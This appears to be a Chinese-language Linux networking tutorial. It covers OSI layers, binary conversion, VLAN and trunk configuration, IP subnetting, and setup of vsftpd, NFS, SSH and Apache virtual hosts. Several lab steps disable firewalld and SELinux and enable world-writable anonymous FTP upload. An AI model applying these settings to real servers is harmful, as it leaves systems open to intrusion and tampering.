<p><strong>5层模型协议分类</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># 应用层</span></span></span><br><span class="line">​	HTTP/超文本传输协议/网站------淘宝</span><br><span class="line">​	SSH/远程连接协议/远程控制-----QQ远程桌面</span><br><span class="line">​	FTP/文件传输协议-------------电影天堂</span><br><span class="line">​	SMTP/简单邮件传输协议/Email---QQ邮箱</span><br><span class="line">​	DNS/域名服务/WWW-------------baiyun.com</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># 传输层</span></span></span><br><span class="line">​	TCP/传输控制协议/可靠-------鸡毛信、挂号信</span><br><span class="line">​	UDP/用户数据报协议/不可靠----普通信</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># 网络层</span></span></span><br><span class="line">​	IP/互联网协议/寻址----------全球地址</span><br><span class="line">​	ICMP/网络消息管理协议/测试---通信兵</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># 数据链路层</span></span></span><br><span class="line">​	MAC---------家到邮局的地址</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># 物理层</span></span></span><br><span class="line">​	网线--------公路</span><br><span class="line">​	光纤--------航道</span><br></pre></td></tr></table></figure>

<h2 id="三、进制转换"><a href="#三、进制转换" class="headerlink" title="三、进制转换"></a>三、进制转换</h2><p><strong>十进制</strong></p>
<p>​    数值：0~9</p>
<p>​    数位：123</p>
<p>​    位权：百位十位个位</p>
<p><strong>二进制</strong></p>
<p>​    数值：0~1</p>
<p>​    数位：10</p>
<p>​    位权：128-64-32-16-8-4-2-1</p>
<p><strong>十六进制</strong></p>
<p>​    数值：0~9，A(10),B(11),C(12),D(13),E(14),F(15)</p>
<p>​    数位：10</p>
<p>​    位权：十六的倍数</p>
<p><strong>二进制、十进制互转</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">10和2互转</span><br><span class="line">128   64    32   16     8      4     2      1</span><br><span class="line">1     1     1     1     1      1     1      1</span><br><span class="line"></span><br><span class="line">位权加减法</span><br><span class="line">十进制转换成2进制</span><br><span class="line"></span><br><span class="line">方法：</span><br><span class="line">1  请将8位2进制，每个位置的位权写出来。</span><br><span class="line">2  通过加减法，在2进制位权中取得相应数字。 不足的位置用0填充。</span><br><span class="line"></span><br><span class="line">示例：</span><br><span class="line">129=1000 0001</span><br><span class="line">192=1100 0000</span><br><span class="line">130=1000 0010</span><br><span class="line"></span><br><span class="line">67=0100 0011</span><br><span class="line">33=0010 0001</span><br><span class="line"></span><br><span class="line">二进制转十进制</span><br><span class="line">示例：</span><br><span class="line">1010 1010=170</span><br><span class="line">1111 1110=？</span><br></pre></td></tr></table></figure>

<p><strong>单位换算</strong></p>
<p>​    ASCII<br>​    比特=bit=b=1/0<br>​    字节=byte=B=8个比特<br>​    1KB=1024B<br>​    1MB=1024KB<br>​    1GB=1024MB<br>​    1TB=1024GB</p>
<h1 id="⑭Linux网络管理实战2"><a href="#⑭Linux网络管理实战2" class="headerlink" title="⑭Linux网络管理实战2"></a>⑭Linux网络管理实战2</h1><h2 id="一、物理层"><a href="#一、物理层" class="headerlink" title="一、物理层"></a>一、物理层</h2><h3 id="1-信号"><a href="#1-信号" class="headerlink" title="1.信号"></a>1.信号</h3><ul>
<li>模拟信号<br>不断变换的物理量，适用电话网络</li>
</ul>
<p><img src= "/img/loading.gif" data-src="/2018/04/16/linux%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/image-20200717204508987.png" alt="image-20200717204508987"></p>
<ul>
<li><p>数字信号<br>​    两种恒定物理量，适用计算机网络<br>​    优点：抗噪音和抗衰减比较强</p>
<p><img src= "/img/loading.gif" data-src="/2018/04/16/linux%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/image-20200717204801100.png" alt="image-20200717204801100"></p>
</li>
</ul>
<h3 id="2-介质"><a href="#2-介质" class="headerlink" title="2.介质"></a>2.介质</h3><p>​    <strong>双绞线</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">EIA&#x2F;TIA568标准</span><br><span class="line"></span><br><span class="line">​外形：八根线芯，两两互绞				</span><br><span class="line">​功能分类</span><br><span class="line">	屏蔽型</span><br><span class="line">	非屏蔽性</span><br><span class="line">​速率分类</span><br><span class="line">	cat 5 &#x2F;5类线&#x2F;10M100M</span><br><span class="line">	cat 5e&#x2F;超五类线&#x2F;10M100M</span><br><span class="line">	cat 6</span><br><span class="line">​接口</span><br><span class="line">	RJ45&#x2F;水晶头</span><br><span class="line">	线序：EIA&#x2F;TIA568B：橙白，橙，绿白，蓝，蓝白，绿，棕白 ，棕</span><br><span class="line">	标准网线：两端线序相同。</span><br></pre></td></tr></table></figure>

<p><strong>光纤</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">	多模&#x2F;单模</span><br><span class="line">​	纤芯粗&#x2F;纤芯细</span><br><span class="line">​	低速&#x2F;高速</span><br><span class="line">​	近&#x2F;远</span><br><span class="line">​	便宜&#x2F;贵</span><br><span class="line">​	FC&#x2F;ST&#x2F;LC&#x2F;</span><br></pre></td></tr></table></figure>

<h2 id="二、数据链路层"><a href="#二、数据链路层" class="headerlink" title="二、数据链路层"></a>二、数据链路层</h2><h3 id="1-功能"><a href="#1-功能" class="headerlink" title="1.功能"></a>1.功能</h3><p>链路创建，维护，管理，帧封装，传输，同步，差错校验</p>
<h3 id="2-地址"><a href="#2-地址" class="headerlink" title="2.地址"></a>2.地址</h3><p>MAC地址：媒体访问控制地址（Media Access Control Address）</p>
<p>结构：48位2进制数字，12位16进制数字</p>
<p>示例：</p>
<p>​        前六位是厂商标识，后六位是硬件标识</p>
<p>​        00-21-CC-C3-8C-B0</p>
<h3 id="3-帧封装"><a href="#3-帧封装" class="headerlink" title="3.帧封装"></a>3.帧封装</h3><p>MAC 地址是怎么写到信息当中的呢？</p>
<p>答：目标MAC//源MAC//数据//CRC</p>
<p>图示：</p>
<p><img src= "/img/loading.gif" data-src="/2018/04/16/linux%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/image-20200717210320231.png" alt="image-20200717210320231"></p>
<h3 id="4-交换机工作原理"><a href="#4-交换机工作原理" class="headerlink" title="4.交换机工作原理"></a>4.交换机工作原理</h3><p>学习/广播/转发/更新</p>
<p><img src= "/img/loading.gif" data-src="/2018/04/16/linux%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/image-20200717210412679.png" alt="image-20200717210412679"></p>
<p><img src= "/img/loading.gif" data-src="/2018/04/16/linux%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/image-20200717210426435.png" alt="image-20200717210426435"></p>
<h3 id="5-组建局域网"><a href="#5-组建局域网" class="headerlink" title="5.组建局域网"></a>5.组建局域网</h3><p>通过Cisco Packte Tracert软件，组建一个局域网</p>
<p>思路</p>
<p>1 安装cisco cpt软件<br>        2 部署交换机和主机<br>        3 直通线连线，主机和交换机。<br>        4 为每个主机配置IP,互相ping测试<br>        5 通过show  mac-address-table。观察交换机工作原理。<br>        6 更换某个主机于交换机连接的接口，ping测试后， 再次观察交换机的更新。    </p>
<p><img src= "/img/loading.gif" data-src="/2018/04/16/linux%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/image-20200717210554510.png" alt="image-20200717210554510">                </p>
<h3 id="6-VLAN"><a href="#6-VLAN" class="headerlink" title="6.VLAN"></a>6.VLAN</h3><p>VLAN：虚拟局域网络（Virtual Local Area Network）</p>
<img src= "/img/loading.gif" data-src="/2018/04/16/linux%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/image-20200717210824136.png" alt="image-20200717210824136" style="zoom: 80%;">

<img src= "/img/loading.gif" data-src="/2018/04/16/linux%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/image-20200717210851295.png" alt="image-20200717210851295" style="zoom:80%;">

<p><strong>划分VLAN的方法</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">创建VLAN （2~1024）</span><br><span class="line">​根据接口和VLAN的关系</span><br><span class="line">	接口和VLAN 10</span><br><span class="line">	F0&#x2F;1~F0&#x2F;10   VLAN 10</span><br><span class="line">	F0&#x2F;11~F0&#x2F;20  VLAN 20</span><br></pre></td></tr></table></figure>

<p><strong>配置</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">实验1：交换机1上配置</span><br><span class="line">​enable      #特权</span><br><span class="line">​config  t   #进入配置模式（config）#</span><br><span class="line">​vlan 10     #创建局域网10</span><br><span class="line">​vlan 20     #创建局域网20</span><br><span class="line">​interface  fastethernet0/1   #必须要在接口模式下才可以输入</span><br><span class="line">​switch access vlan 10        #将端口加入VLAN</span><br><span class="line">​interface  f0/2</span><br><span class="line">​switch access vlan 10</span><br><span class="line">​interface  f0/3</span><br><span class="line">​switch access vlan 20</span><br><span class="line">​interface  f0/4</span><br><span class="line">​switch access vlan 20</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">### 验证</span></span></span><br><span class="line">使用相同vlan主机通信成功，不同vlan主机通信不成功。</span><br></pre></td></tr></table></figure>

<h3 id="7-TRUNK"><a href="#7-TRUNK" class="headerlink" title="7.TRUNK"></a>7.TRUNK</h3><p><strong>干道</strong></p>
<p><strong>核心技术</strong>：打标    </p>
<p><img src= "/img/loading.gif" data-src="/2018/04/16/linux%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/image-20200717211912206.png" alt="image-20200717211912206"></p>
<p><strong>目的</strong>：通过一根网线，传递不同VLAN 信息。</p>
<p><strong>配置</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">在另一台交换机上switch2，实现划分vlan 的行为。雷同于实验1</span><br><span class="line"></span><br><span class="line">​enable      #特权</span><br><span class="line">​config  t   #进入配置模式（config）#</span><br><span class="line">​vlan 10     #创建局域网10</span><br><span class="line">​vlan 20     #创建局域网20</span><br><span class="line">​interface  fastethernet0/1   #必须要在接口模式下才可以输入</span><br><span class="line">​switch access vlan 10        #将端口加入VLAN</span><br><span class="line">​interface  f0/2</span><br><span class="line">​switch access vlan 10</span><br><span class="line">​interface  f0/3</span><br><span class="line">​switch access vlan 20</span><br><span class="line">​interface  f0/4</span><br><span class="line">​switch access vlan 20</span><br><span class="line">​在交换机互联的接口中配置</span><br><span class="line">​interface  f0/5</span><br><span class="line">​switch mode  trunk   #配置链路</span><br><span class="line">​switch1 也需要在f0/5配置trunk链路</span><br></pre></td></tr></table></figure>

<p><strong>测试</strong></p>
<p>实现不同交换机上，相同VLAN主机通信成功。</p>
<p>实现不同交换机上，不相同VLAN主机通信不成功。</p>
<p><strong>总结</strong></p>
<p>​        交换机接口工作模式，分为acces和trunk</p>
<p>​        access是指定接口连接的是主机</p>
<p>​        trunk是指定接口连接的是交换机，需要通过多个VLAN的数据</p>
<h1 id="⑮Linux网络管理实战3—网络层"><a href="#⑮Linux网络管理实战3—网络层" class="headerlink" title="⑮Linux网络管理实战3—网络层"></a>⑮Linux网络管理实战3—网络层</h1><h2 id="一、IP地址"><a href="#一、IP地址" class="headerlink" title="一、IP地址"></a>一、IP地址</h2><p>简介</p>
<p>​    32位二进制数，用于主机在互联网中的标识，4组十进制数表示。IP地址每八位为一组，用”.”分割，用十进制标识。例如：<br>​        192.168.0.1<br>​        156.86.254.255</p>
<h3 id="1、IP分类"><a href="#1、IP分类" class="headerlink" title="1、IP分类"></a>1、IP分类</h3><table>
<thead>
<tr>
<th align="center">类型</th>
<th align="center">网段</th>
<th align="center">备注</th>
</tr>
</thead>
<tbody><tr>
<td align="center"><strong>A类</strong></td>
<td align="center"><strong>1~126</strong></td>
<td align="center">127:回环地址：本机</td>
</tr>
<tr>
<td align="center"><strong>B类</strong></td>
<td align="center"><strong>128~191</strong></td>
<td align="center"></td>
</tr>
<tr>
<td align="center"><strong>C类</strong></td>
<td align="center"><strong>192~223</strong></td>
<td align="center"></td>
</tr>
<tr>
<td align="center">D类</td>
<td align="center">224~239</td>
<td align="center">组播</td>
</tr>
<tr>
<td align="center">E类</td>
<td align="center">240~255</td>
<td align="center">科研</td>
</tr>
</tbody></table>
<p><strong>私有IP分类</strong></p>
<p>​    A类：10.0.0.0~10.255.255.255</p>
<p>​    B类：172.16.0.0~172.31.255.255</p>
<p>​    C类：192.168.0.0~192.168.255.255</p>
<h3 id="2-子网掩码"><a href="#2-子网掩码" class="headerlink" title="2.子网掩码"></a>2.子网掩码</h3><p>作用：32位2进制数字运算出IP地址的网络部分。</p>
<p><strong>分类：</strong></p>
<p>​        A类：255.0.0.0</p>
<p>​        B类：255.255.0.0</p>
<p>​        C类：255.255.255.0</p>
<p>方法：</p>
<p>​        子网掩码中为1部分，对应IP地址的网络位。IP地址和子网掩码，逻辑与运算</p>
<p>网络地址：</p>
<p>​    网络位相同，IP地址是同一网段</p>
<p>​    网络位不同，IP地址不是同一网段</p>
<h2 id="二、网络层封装（略）"><a href="#二、网络层封装（略）" class="headerlink" title="二、网络层封装（略）"></a>二、网络层封装（略）</h2><h2 id="三、路由器工作原理（略）"><a href="#三、路由器工作原理（略）" class="headerlink" title="三、路由器工作原理（略）"></a>三、路由器工作原理（略）</h2><h1 id="⑯Linux文件服务"><a href="#⑯Linux文件服务" class="headerlink" title="⑯Linux文件服务"></a>⑯Linux文件服务</h1><h2 id="一、FTP-Server"><a href="#一、FTP-Server" class="headerlink" title="一、FTP Server"></a>一、FTP Server</h2><p>FTP（File Transfer Protocol，文件传输协议） 是 TCP/IP 协议组中的协议之一</p>
<p>作用：提供文件共享服务。互联网上多的媒体资源和软件资源，绝大部分都是通过FTP服务器传递。</p>
<p>软件包：vsftpd        </p>
<p>基础：</p>
<p>​    <strong>控制端口 command 21/tcp</strong> </p>
<p>​    <strong>数据端口 data 20/tcp</strong></p>
<h3 id="1-FTP-Server-默认配置"><a href="#1-FTP-Server-默认配置" class="headerlink" title="1.FTP Server 默认配置"></a>1.FTP Server 默认配置</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">### 1.安装vsftp</span></span></span><br><span class="line">yum -y install vsftpd</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">### 2.准备分发的文件</span></span></span><br><span class="line">touch /var/ftp/abc.txt</span><br><span class="line">注释：FTP服务器的主目录：“/var/ftp/”，是FTP程序分享内容的本机目录。</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">### 3.启动服务</span></span></span><br><span class="line">systemctl start vsftpd</span><br><span class="line">systemctl enable vsftpd</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">### 4.关闭防火墙</span></span></span><br><span class="line">systemctl  stop firewalld</span><br><span class="line">systemctl  disable firewalld</span><br><span class="line">setenforce 0</span><br><span class="line">vim   /etc/selinux/config</span><br><span class="line">修改内容为：SELINUX=disabled</span><br></pre></td></tr></table></figure>

<h3 id="2-FTP-Clinet"><a href="#2-FTP-Clinet" class="headerlink" title="2.FTP Clinet"></a>2.FTP Clinet</h3><p><strong>LinuxFTP客户端程序1：lftp</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">#### 安装客户端工具</span></span></span><br><span class="line">[root@qianfeng ~]# yum -y install lftp</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">#### 访问服务器</span></span></span><br><span class="line">[root@qianfeng ~]# lftp 服务器的IP地址</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">#### 查看并下载</span></span></span><br><span class="line">lftp qianfeng:~&gt; ls </span><br><span class="line">drwxr-xr-x 2 0 0 4096 Mar 31 2019 pub</span><br><span class="line">-rw-r--r-- 1 0 0 0 Nov 22 03:53 abc.txt</span><br><span class="line"></span><br><span class="line">lftp qianfeng:~&gt; get abc.txt  #下载文件</span><br><span class="line">lftp qianfeng:~&gt; mirror pub   #下载目录</span><br></pre></td></tr></table></figure>

<p><strong>LinuxFTP客户端程序2：wget</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@qianfeng ~]# wget ftp://192.168.142.132/abc.txt</span><br><span class="line">[root@qianfeng ~]# wget ftp://192.168.142.132/abc.txt -O /tmp/a.sh</span><br><span class="line">-O 指定文件名和路径</span><br><span class="line">[root@qianfeng ~]# wget http://nginx.org/download/nginx-1.10.2.tar.gz</span><br><span class="line">[root@qianfeng ~]# wget -m ftp://zhufo.top/soft</span><br><span class="line">-m 下载目录</span><br></pre></td></tr></table></figure>

<p><strong>任何系统firefox、IE</strong></p>
<p>​        1.客户机打开浏览器</p>
<p>​        2.输入“ftp://服务器IP地址”</p>
<p>​            默认仅能下载文件</p>
<h3 id="3-启动上传功能"><a href="#3-启动上传功能" class="headerlink" title="3.启动上传功能"></a>3.启动上传功能</h3><p>配置文件  /etc/vsftpd/vsftpd.conf</p>
<p><strong>1.检查禁用匿名账户登录开启</strong></p>
<p>目的：启用禁用匿名账号（默认，比较方便）</p>
<p>anonymous_enable=YES<br>     //是否允许匿名用户登录ftp</p>
<p><strong>2.配置上传指令</strong></p>
<p>  anon_upload_enable=YES<br>          //启动上传文件功能<br>          anon_mkdir_write_enable=YES<br>          //启动创建目录功能</p>
<p><strong>3.创建上传目录</strong></p>
<p>  mkdir   /var/ftp/upload<br>          chmod  777   /var/ftp/upload</p>
<p><strong>4.客户端测试</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">登录服务器</span><br><span class="line">​	lftp 192.168.142.129</span><br><span class="line">上传文件</span><br><span class="line">​	前提是客户机要有一个2.txt文件</span><br><span class="line">​	然后进入上传目录</span><br><span class="line">​	cd   upload</span><br><span class="line">​	put 2.txt</span><br><span class="line">创建目录</span><br><span class="line">​	mkdir 222</span><br><span class="line">上传目录</span><br><span class="line">​	前提是你要有一个文件夹，等着上传。</span><br><span class="line">​	mirror -R aaa</span><br></pre></td></tr></table></figure>

<h2 id="二、NFS-Server"><a href="#二、NFS-Server" class="headerlink" title="二、NFS Server"></a>二、NFS Server</h2><p>NFS：Network File System 网络文件系统，Linux/Unix系统之间共享文件的一种协议</p>
<p>NFS 的客户端主要为Linux，支持多节点同时挂载以及并发写入</p>
<p><strong>作用</strong>：</p>
<p>​        提供文件共享服务</p>
<p>​        为 Web Server 配置集群中的后端存储</p>
<p>此次实验环境：</p>
<p>nas 192.168.142.133<br>​        web1 192.168.142.132<br>​        web2 192.168.142.130<br>​        web3 192.168.142.134</p>
<p>关防火墙</p>
<p>vi   /etc/selinux/config<br>​        SELINUX=disabled<br>​        setenforce 0<br>​        systemctl stop firewalld<br>​        systemctl disable firewalld</p>
<h3 id="1、nas（存储端）"><a href="#1、nas（存储端）" class="headerlink" title="1、nas（存储端）"></a>1、nas（存储端）</h3><p>NAS：Network Attached Storage：网络附属存储<br>​        NFS是NAS的一种</p>
<p><strong>（1）安装NFS服务器</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@nas ~]# yum -y install nfs-utils</span><br><span class="line">[root@nas ~]# mkdir /webdata   #存储网站代码</span><br><span class="line">[root@nas ~]# echo "nfs test..." &gt; /webdata/index.html   #放置测试页面</span><br></pre></td></tr></table></figure>

<p><strong>（2）配置NFS服务器</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@nas ~]# vim /etc/exports</span><br><span class="line">/webdata     192.168.142.0/24(rw) </span><br><span class="line">​注释:</span><br><span class="line">/webdata指的是发布资源的目录</span><br><span class="line">192.168.122.0/24允许访问NFS的客户机</span><br><span class="line">(rw)可读可写</span><br></pre></td></tr></table></figure>

<p><strong>（3）启动NFS服务器</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@nas ~]# systemctl start nfs-server</span><br><span class="line">[root@nas ~]# systemctl enable nfs-server</span><br><span class="line"></span><br><span class="line">检查NFS输出是否正常</span><br><span class="line">[root@nas ~]# exportfs -v    //-v 检查输出的目录</span><br><span class="line">/webdata </span><br><span class="line">192.168.122.0/24(rw,wdelay,no_root_squash,no_subtree_check,sec=sys,rw,secure,no_root_squash,no_all_squash)</span><br></pre></td></tr></table></figure>

<h3 id="2-web1-web2-web3-客户端"><a href="#2-web1-web2-web3-客户端" class="headerlink" title="2.web1 web2 web3 客户端"></a>2.web1 web2 web3 客户端</h3><p>三台服务器都进行如下操作：</p>
<p>（1）安装NFS客户端</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@web1 ~]# yum -y install nfs-utils httpd</span><br><span class="line">[root@web1 ~]# systemctl start httpd</span><br><span class="line">[root@web1 ~]# systemctl enable httpd</span><br></pre></td></tr></table></figure>

<p>（2）查看存储端共享</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@web1 ~]# showmount -e 192.168.142.133   //查询NFS服务器可用目录</span><br><span class="line">Export list for 192.168.142.133</span><br><span class="line">/webdata 192.168.142.0/24</span><br></pre></td></tr></table></figure>

<p>（3）手动挂载</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@web1 ~]# mount -t nfs 192.168.142.133:/webdata      /var/www/html/</span><br><span class="line">​注释</span><br><span class="line">mount     -t     nfs    192.168.142.133:/webdata    /var/www/html</span><br><span class="line">挂载命令  类型  nfs类型   nfs服务器地址：nfs输出目录      本地目录</span><br></pre></td></tr></table></figure>

<p>（4）查看挂载</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@web1 ~]# df</span><br><span class="line">192.168.142.133:/webdata 17811456 4444928 13366528   25% /var/www/html</span><br><span class="line">[root@web1 ~]# ls /var/www/html/</span><br><span class="line">index.html</span><br></pre></td></tr></table></figure>

<p>（5）使用web客户端查看web服务器</p>
<h3 id="3-测试网站访问"><a href="#3-测试网站访问" class="headerlink" title="3.测试网站访问"></a>3.测试网站访问</h3><p>firefox 192.168.122.85</p>
<p>firefox 192.168.122.111</p>
<p>firefox 192.168.122.166</p>
<h2 id="三、SSH-Server"><a href="#三、SSH-Server" class="headerlink" title="三、SSH Server"></a>三、SSH Server</h2><p>SSH（安全外壳协议）远程操作和管理系统，方便而且安全可靠</p>
<p><strong>SSH 服务器实战</strong></p>
<p>1.登录Centos</p>
<p>2.查询SSH是否安装</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@ssh ~]# rpm -qa | grep ssh</span><br><span class="line"></span><br><span class="line">若没安装SSH则可输入</span><br><span class="line">[root@web1 ~]# yum install openssh-server</span><br></pre></td></tr></table></figure>

<p>3.SSH服务管理</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">启动服务（默认启动）</span><br><span class="line">[root@ssh ~]# systemctl start sshd </span><br><span class="line"></span><br><span class="line">查看端口</span><br><span class="line">[root@ssh ~]# netstat -antp | grep sshd</span><br><span class="line">//22号端口提供者SSH服务</span><br><span class="line"></span><br><span class="line">开机启动（默认启动）</span><br><span class="line">[root@ssh ~]# systemctl enable sshd</span><br></pre></td></tr></table></figure>

<p>4.使用SSH远程管理</p>
<p>​        ssh   账户名@IP地址</p>
<h1 id="⑰Linux网站服务"><a href="#⑰Linux网站服务" class="headerlink" title="⑰Linux网站服务"></a>⑰Linux网站服务</h1><h2 id="一、概念"><a href="#一、概念" class="headerlink" title="一、概念"></a>一、概念</h2><p>UI的转变：B/S架构</p>
<p>HTML：HyperText Markup Language 超级 文本 标记 语言</p>
<p>网页：使用HTML、PHP、JAVA语言格式书写的文件。</p>
<p>主页：网页中呈现用户的第一个页面。</p>
<p>网站：多个网页组合而成的一台网站服务器</p>
<p>URL：统一资源定位符（Uniform Resource Locator），访问网站的地址。例如<a href="http://www.baidu.com/1.html" target="_blank" rel="noopener">http://www.baidu.com/1.html</a></p>
<p>网站架构：</p>
<p>​        LAMP：Linux + Apache + MySQL + PHP</p>
<p>​        系统+服务器程序+数据管理软件+中间软件</p>
<h2 id="二、静态站点"><a href="#二、静态站点" class="headerlink" title="二、静态站点"></a>二、静态站点</h2><h3 id="1-Apache基础"><a href="#1-Apache基础" class="headerlink" title="1.Apache基础"></a>1.Apache基础</h3><p>（建议使用2.4及以上的版本）</p>
<p>​    Apache官网: <a href="http://www.apache.org" target="_blank" rel="noopener">www.apache.org</a></p>
<p>​    软件包名称： httpd</p>
<p>​    服务端口: 80/tcp(http) 443/tcp(https)</p>
<p>​    配置文件: /etc/httpd/conf/httpd.conf</p>
<p>​    子配置文件：/etc/httpd/conf.d/*.conf</p>
<p>​    主目录：/var/www/html（网站源代码默认位置）</p>
<h3 id="2-安装Apache"><a href="#2-安装Apache" class="headerlink" title="2.安装Apache"></a>2.安装Apache</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">安装</span><br><span class="line">[root@localhost ~]# yum -y install httpd</span><br><span class="line">启动</span><br><span class="line">[root@localhost ~]# systemctl start httpd</span><br><span class="line">查看服务状态</span><br><span class="line">[root@localhost ~]# systemctl status  httpd</span><br><span class="line">开机自启</span><br><span class="line">[root@localhost ~]# systemctl enable httpd</span><br><span class="line"></span><br><span class="line">关闭防火墙</span><br><span class="line">[root@localhost ~]# systemctl stop  firewalld</span><br><span class="line">关闭selinux</span><br><span class="line">[root@localhost ~]# setenforce 0</span><br><span class="line">查看版本</span><br><span class="line">[root@localhost ~]# httpd -v</span><br><span class="line">Server version: Apache/2.4.6 (CentOS)</span><br></pre></td></tr></table></figure>

<h3 id="3-虚拟主机"><a href="#3-虚拟主机" class="headerlink" title="3.虚拟主机"></a>3.虚拟主机</h3><p>目的：在一台物理服务器上运行多个网站 </p>
<p>类型：基于主机名<a href="http://www.a.org、www.b.org" target="_blank" rel="noopener">www.a.org、www.b.org</a></p>
<p>配置虚拟主机目标：</p>
<p>​        在一台服务器上，实现两个网站的架设</p>
<p>​        网站域名              网站资源存放目录</p>
<p>​        <a href="http://www.a.org" target="_blank" rel="noopener">www.a.org</a>          /var/www/html/a.org </p>
<p>​        <a href="http://www.b.org" target="_blank" rel="noopener">www.b.org</a>         /b.org </p>
<p>​       ！！！注意关闭firewalld和selinux</p>
<ul>
<li><strong>服务器</strong></li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">###   www.a.org站点设置</span></span></span><br><span class="line">========================</span><br><span class="line">1.准备网站源码（网页）目录</span><br><span class="line">[root@localhost ~]# mkdir /var/www/html/a.org </span><br><span class="line">[root@localhost ~]# vim /var/www/html/a.org/index.html </span><br><span class="line">输入网页内容，a.com.com.com</span><br><span class="line"></span><br><span class="line">2.创建a.org的网站配置文件</span><br><span class="line">[root@localhost ~]# vim /etc/httpd/conf.d/a.org.conf </span><br><span class="line">&lt;VirtualHost *:80&gt;     //某个虚拟主机</span><br><span class="line">ServerName www.a.org   //服务器起个名字</span><br><span class="line">DocumentRoot /var/www/html/a.org   //网站的根目录</span><br><span class="line">&lt;/VirtualHost&gt;</span><br><span class="line"></span><br><span class="line">3.检测配置文件语法，重启服务</span><br><span class="line">[root@localhost ~]# httpd -t </span><br><span class="line">[root@localhost ~]# systemctl restart httpd </span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">###   www.b.org站点设置</span></span></span><br><span class="line">========================</span><br><span class="line">1.准备网站源码目录</span><br><span class="line">[root@localhost ~]# mkdir /b.org </span><br><span class="line">[root@localhost ~]# vim /b.org/index.html </span><br><span class="line">b.org.org.org作为网页内容</span><br><span class="line"></span><br><span class="line">2.创建b.org的网站配置文件 </span><br><span class="line">[root@localhost ~]# vim /etc/httpd/conf.d/b.org.conf </span><br><span class="line"><span class="meta">#</span><span class="bash">在文件中输入以下内容</span></span><br><span class="line">&lt;VirtualHost *:80&gt;</span><br><span class="line">ServerName www.b.org</span><br><span class="line">DocumentRoot /b.org</span><br><span class="line">&lt;/VirtualHost&gt;</span><br><span class="line">&lt;Directory "/b.org"&gt;</span><br><span class="line">Require all granted</span><br><span class="line">&lt;/Directory&gt;</span><br><span class="line"></span><br><span class="line">3.检测配置文件语法，重启服务</span><br><span class="line">[root@localhost ~]# httpd -t </span><br><span class="line">无报错，就可以启动服务器了</span><br><span class="line">[root@localhost ~]# systemctl restart httpd</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>客户端</strong></li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># Linux客户端域名解析</span></span></span><br><span class="line">[root@localhost ~]# vim  /etc/hosts</span><br><span class="line">10.0.128.118  www.a.org   //填写web服务器的IP</span><br><span class="line">10.0.128.118  www.b.org   //填写web服务器的IP</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># Linux客户端测试网站可用性</span></span></span><br><span class="line">字符测试</span><br><span class="line">[root@localhost ~]# yum install -y elinks</span><br><span class="line">[root@localhost ~]# elink http://www.b.org</span><br><span class="line">图形测试：通过火狐浏览器，分别访问两个网站地址</span><br></pre></td></tr></table></figure>

<h2 id="三、动态站点"><a href="#三、动态站点" class="headerlink" title="三、动态站点"></a>三、动态站点</h2><h3 id="部署论坛系统discuz"><a href="#部署论坛系统discuz" class="headerlink" title="部署论坛系统discuz"></a>部署论坛系统discuz</h3><p>​    discuz开源论坛代码服务社区</p>
<p>1.基础环境</p>
